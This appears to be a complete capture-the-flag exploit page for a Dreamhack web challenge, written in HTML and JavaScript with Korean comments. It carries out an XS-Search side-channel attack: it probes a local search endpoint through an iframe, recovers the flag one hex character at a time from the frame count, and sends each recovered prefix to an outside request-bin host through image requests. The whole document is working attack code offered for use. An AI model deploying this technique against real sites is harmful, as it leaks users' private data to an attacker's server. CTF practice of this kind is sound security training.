<iframe id="iframe"></iframe>
<img id="img" />

<script>
  const iframe = document.getElementById("iframe");
  const img = document.getElementById("img");

  async function searchChar(data) {
    return new Promise((resolve) => {
      iframe.onload = () => {
        resolve(iframe.contentWindow.frames.length > 0);
      };

      iframe.src =
        "http://127.0.0.1:8000/search?query=" + encodeURIComponent(data);
    });
  }

  const chars = "0123456789abcdef";

  // 이전 실행에서 얻은 값부터 계속 시작
  let flag = "DH{";

  async function findFlag() {
    // DH{ 3글자 + 해시 32글자 = 길이 35
    while (flag.length < 35) {
      let found = false;

      for (const char of chars) {
        if (await searchChar(flag + char)) {
          flag += char;
          found = true;

          img.src =
            "https://jyhfhuq.request.dreamhack.games/?flag=" +
            encodeURIComponent(flag);

          break;
        }
      }

      // 일치하는 문자가 없을 때 무한 반복 방지
      if (!found) {
        img.src =
          "https://jyhfhuq.request.dreamhack.games/?error=" +
          encodeURIComponent(flag);
        return;
      }
    }

    flag += "}";

    img.src =
      "https://jyhfhuq.request.dreamhack.games?complete=" +
      encodeURIComponent(flag);
  }

  findFlag();
</script>
